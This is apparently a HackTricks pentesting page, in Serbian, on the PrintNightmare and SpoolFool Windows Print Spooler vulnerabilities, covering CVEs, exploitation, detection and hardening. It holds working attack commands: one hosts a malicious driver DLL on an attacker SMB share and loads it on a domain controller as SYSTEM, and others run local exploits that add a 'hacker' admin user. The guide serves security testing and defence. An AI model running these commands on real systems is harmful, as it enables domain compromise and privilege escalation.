# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare je zajednički naziv za grupu ranjivosti u Windows usluzi **Print Spooler** koje omogućavaju **izvršavanje proizvoljnog koda kao SYSTEM** i, kada je spooler dostupan preko RPC-a, **daljinsko izvršavanje koda (RCE) na kontrolerima domena i serverima datoteka**. Najčešće iskorišćavani CVE-ovi su **CVE-2021-1675** (prvobitno klasifikovan kao LPE) i **CVE-2021-34527** (potpuni RCE). Naknadni problemi, kao što su **CVE-2021-34481 (“Point & Print”)** i **CVE-2022-21999 (“SpoolFool”)**, pokazuju da površina za napad i dalje nije ni blizu zatvorena.

Ako tražite **iznuđivanje autentifikacije / relay** preko spoolera, a ne **RCE/LPE zasnovan na drajverima**, pogledajte [ovu drugu stranicu o zloupotrebi iznuđivanja autentifikacije preko štampača](printers-spooler-service-abuse.md). Ova stranica se bavi **učitavanjem drajvera / DLL-ova kao SYSTEM**.

---

## 1. Ranjive komponente i CVE-ovi

| Godina | CVE | Kratak naziv | Primitiv | Napomene |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Zakrpano junskim CU-om iz 2021, ali zaobiđeno pomoću CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` omogućava autentifikovanim korisnicima da učitaju DLL drajvera sa udaljenog deljenog resursa; posle avgusta 2021. to obično zahteva oslabljene Point & Print smernice|
|2021|CVE-2021-34481|“Point & Print”|LPE|Instalacija nepotpisanog drajvera od strane korisnika koji nisu administratori|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Kreiranje proizvoljnih direktorijuma → postavljanje DLL-a – funkcioniše i posle zakrpa iz 2021.|

Svi oni zloupotrebljavaju jedan od **MS-RPRN / MS-PAR RPC metoda** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) ili odnose poverenja unutar **Point & Print**.

## 2. Tehnike eksploatacije

### 2.1 Kompromitovanje udaljenog kontrolera domena (CVE-2021-34527)

Autentifikovani, ali **neprivilegovani** korisnik domena može da pokrene proizvoljne DLL-ove kao **NT AUTHORITY\SYSTEM** na udaljenom spooleru (često na kontroleru domena) tako što:

```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
       -f \
       '\\attacker_IP\share\evil.dll'
```

Popularni PoC-ovi uključuju **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) i module `misc::printnightmare / lsa::addsid` Benjamina Delpyja u alatu **mimikatz**.

### 2.2 Lokalna eskalacija privilegija (bilo koja podržana verzija Windowsa, 2021–2024)

Isti API se može pozvati **lokalno** da bi se učitao drajver iz direktorijuma `C:\Windows\System32\spool\drivers\x64\3\` i ostvarile SYSTEM privilegije:

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```

### 2.3 Savremena trijaža na zakrpljenim hostovima

Na potpuno ažuriranom hostu, javni PrintNightmare PoC-ovi često ne uspevaju jer Windows sada podrazumevano dozvoljava instaliranje upravljačkih programa za štampače **samo administratorima** (`RestrictDriverInstallationToAdministrators=1` od 10. avgusta 2021). Pre nego što pokrenete exploit protiv cilja, prvo proverite da li je u okruženju vraćena prethodna bezbednosna postavka zbog starijih instalacija štampača:<sup>[[3]](#references)</sup>

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```

Dve najzanimljivije slabe vrednosti su obično:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Iz Linux-a brzo proverite da li cilj izlaže relevantne print RPC interfejse pre pokretanja PoC-a:

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

Neki noviji javno dostupni alati takođe nude bezbedniji tok rada **check/list** pre slanja DLL-a:

```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```

> Ako kao korisnik sa niskim privilegijama dobijete `RPC_E_ACCESS_DENIED` (`0x000...`), obično nailazite na podrazumevano ponašanje uvedeno posle 2021, a ne na grešku u transportu.

> Na Windows 11 22H2+ i novijim klijentskim verzijama, udaljeno štampanje podrazumevano koristi **RPC over TCP**, dok je **RPC over named pipes** (`\PIPE\spoolss`) onemogućen, osim ako se izričito ponovo ne omogući. Neki stariji PoC-ovi i beleške iz laboratorija i dalje pretpostavljaju da je named pipe dostupan.<sup>[[4]](#references)</sup>

### 2.4 Zloupotreba Package Point & Print u „zakrpljenim“ mrežama

Mnoga poslovna okruženja ostala su **ranjiva zbog pravila** i nakon originalnih zakrpa iz 2021, jer su tokovi rada službe podrške ili servera za štampanje i dalje zahtevali da korisnici koji nisu administratori instaliraju/ažuriraju drajvere. U praksi, ofanzivni postupak izgleda ovako:

- Ako su bezbednosni upiti potpuno onemogućeni, **klasični PrintNightmare sa proizvoljnim DLL-om** i dalje je najkraći put.
- Ako je omogućena opcija `Only use Package Point and Print`, obično treba preći na putanju sa **drajverom koji podržava potpisane pakete**, umesto na direktno ubacivanje DLL-a.<sup>[[3]](#references)</sup>
- Istraživanje iz 2024. pokazalo je da **`Package Point and Print - Approved servers` sam po sebi nije čvrsta granica poverenja**: ako napadač može da lažira ili preotme razrešavanje imena za jedan odobreni server za štampanje, žrtve se i dalje mogu preusmeriti na zlonamerni server koji prolazi provere pravila.<sup>[[4]](#references)</sup>
- Čak i kombinovanje UNC hardeninga sa prisilnim RPC-over-SMB može biti nepouzdano, jer savremeni klijenti mogu **preći na RPC over TCP**.<sup>[[4]](#references)</sup>

Zato je savremeno iskorišćavanje u stilu PrintNightmare-a često više usmereno na **zloupotrebu pravila za postavljanje štampača u preduzećima** nego na neizmenjeno ponavljanje originalnog PoC-a iz 2021.

### 2.5 SpoolFool (CVE-2022-21999) – zaobilaženje ispravki iz 2021.

Microsoftove zakrpe iz 2021. blokirale su udaljeno učitavanje drajvera, ali **nisu ojačale dozvole za direktorijume**. SpoolFool zloupotrebljava parametar `SpoolDirectory` da bi napravio proizvoljan direktorijum unutar `C:\Windows\System32\spool\drivers\`, smestio payload DLL i primorao spooler da ga učita:<sup>[[2]](#references)</sup>

```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```

> Exploit funkcioniše na potpuno ažuriranim sistemima Windows 7 → Windows 11 i Server 2012R2 → 2022 pre ažuriranja iz februara 2022<sup>[[2]](#references)</sup>

---

## 3. Detekcija i lov na pretnje

* **PrintService logovi** – omogućite kanal *Microsoft-Windows-PrintService/Operational* i pratite **Event ID 316** (dodat/ažuriran drajver, obično uključuje nazive DLL-ova) i pri uspešnim i pri neuspešnim pokušajima. Uparite ga sa **Event ID 808/811** za sumnjive greške pri učitavanju modula/drajvera spoolera.
* **Sysmon** – `Event ID 7` (učitana slika) ili `11/23` (upisivanje/brisanje datoteke) unutar `C:\Windows\System32\spool\drivers\*` kada je roditeljski proces **spoolsv.exe**.
* **Linija procesa** – generišite upozorenje kad god **spoolsv.exe** pokrene `cmd.exe`, `rundll32.exe`, PowerShell ili bilo koji neočekivani nepotpisani podređeni proces.
* **Mrežna telemetrija** – neočekivana SMB preuzimanja iz procesa `spoolsv.exe` sa deljenih lokacija pod kontrolom napadača ili neuobičajen printer RPC saobraćaj sa servera koji ne bi trebalo da rade kao print serveri predstavljaju korisne signale visokog stepena pouzdanosti.

## 4. Ublažavanje i ojačavanje

1. **Patch!** – Instalirajte najnovije kumulativno ažuriranje na svakom Windows hostu na kojem je instalirana usluga Print Spooler.
2. **Onemogućite spooler tamo gde nije potreban**, naročito na Domain Controller-ima:
   ```powershell
   Stop-Service Spooler -Force
   Set-Service Spooler -StartupType Disabled
   ```
3. **Blokirajte udaljene veze** uz istovremeno omogućavanje lokalnog štampanja – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Ograničite Point & Print samo na administratore** tako što ćete podesiti:
   ```cmd
   reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
           /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
   ```
   Detaljna uputstva u Microsoft KB5005652<sup>[[1]](#references)</sup>
5. Ako poslovni zahtevi nalažu `RestrictDriverInstallationToAdministrators=0`, sve ostale smernice za štampače tretirajte samo kao **delimične mere ublažavanja**. U najmanju ruku, dajte prednost **package-aware drajverima**, omogućite **Only use Package Point and Print** i ograničite **Package Point and Print - Approved servers** na eksplicitno navedene print servere unutar forest-a.<sup>[[3]](#references)</sup>
6. **Nemojte vraćati privatnost printer RPC-a na prethodna podešavanja** samo da biste popravili neispravna mapiranja štampača. Okruženja koja postavljaju `RpcAuthnLevelPrivacyEnabled=0` poništavaju hardening uveden za **CVE-2021-1678** i obično zaslužuju dodatnu proveru tokom angažmana.<sup>[[4]](#references)</sup>

---

## 5. Povezana istraživanja / alati

* Moduli [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – standardna Impacket implementacija sa režimima `-check`, `-list` i `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – omotač sa ugrađenom SMB isporukom, podrškom za više ciljeva i režimima `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – zloupotreba sopstvenog ranjivog drajvera štampača preko package Point & Print
* SpoolFool exploit i analiza
* 0patch mikrozakrpe za SpoolFool i druge greške spooler-a

Ako želite da **iznudite autentifikaciju** preko spooler-a umesto da učitavate drajver, pređite na [zloupotrebu printer spooler servisa](printers-spooler-service-abuse.md).

---

## References

- [1] [Microsoft – KB5005652: Upravljanje novim podrazumevanim ponašanjem instalacije drajvera za Point and Print](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – Praktični vodič za PrintNightmare u 2024.](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – PrintNightmare još nije završen](https://itm4n.github.io/printnightmare-not-over/)
{{#include ../../banners/hacktricks-training.md}}
